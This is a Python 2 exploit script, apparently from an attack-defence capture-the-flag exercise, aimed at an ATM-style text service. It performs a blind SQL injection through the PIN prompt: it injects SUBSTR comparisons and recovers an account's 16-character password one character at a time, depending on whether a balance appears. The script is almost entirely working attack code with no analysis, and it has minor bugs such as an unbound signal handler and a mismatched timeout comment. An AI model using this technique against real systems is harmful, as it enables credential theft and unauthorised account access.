import socket
import sys
import pexpect
import pexpect.fdpexpect
import pdb
import signal

from exploit_base import *

class Exploit_ATM(Exploit):
	def __init__(self):
		self.service_name = "text"
		self.port_number = 20051

	def signal_handler(signum, frame):
	    raise Exception("Timed out!")

	def exploit(self, ip, port, flag_id):
		characters = []

		#flag_id
		accountNo = flag_id

		for i in range(48, 58):
		    characters.append(chr(i))

		for i in range(65, 91):
		    characters.append(chr(i))

		for i in range(97, 123):
		    characters.append(chr(i))

		password = ""

		for i in range (0, 16):
		    for character in characters:
		        pinValue = "' OR (SUBSTR(password, " + `(i+1)` + ", 1)='" + character + "' AND acnum='" + accountNo + "'); -" + "-"
		        #print pinValue
		        						#ip address to change
		        conn = socket.create_connection((ip,"20051"))
		        c = pexpect.fdpexpect.fdspawn(conn.fileno(), timeout=1)
		        #c = pexpect.spawn("telnet 172.16.182.130 20051")

		        c.expect("");
		        c.expect("");
		        c.expect("Select your choice");
		        c.expect("1.Check Account Balance");
		        c.expect("2.Cash Withdrawal");
		        c.expect("3.Create account");
		        c.expect("Enter any other choice to exit");

		        c.sendline("1")

		        c.expect("Enter account number");
		        
		        c.sendline(accountNo)

		        c.expect("Enter Pin")

		        c.sendline(pinValue)

		        signal.signal(signal.SIGALRM, signal_handler)
		        signal.alarm(1)   # Ten seconds
		        try:
		            resp = c.expect("Your Balance is: .*")
		            #print character
		            password += character
		            break
		        except Exception, msg:
		            tmp = 1

		        c.close()
		        conn.close()
		return password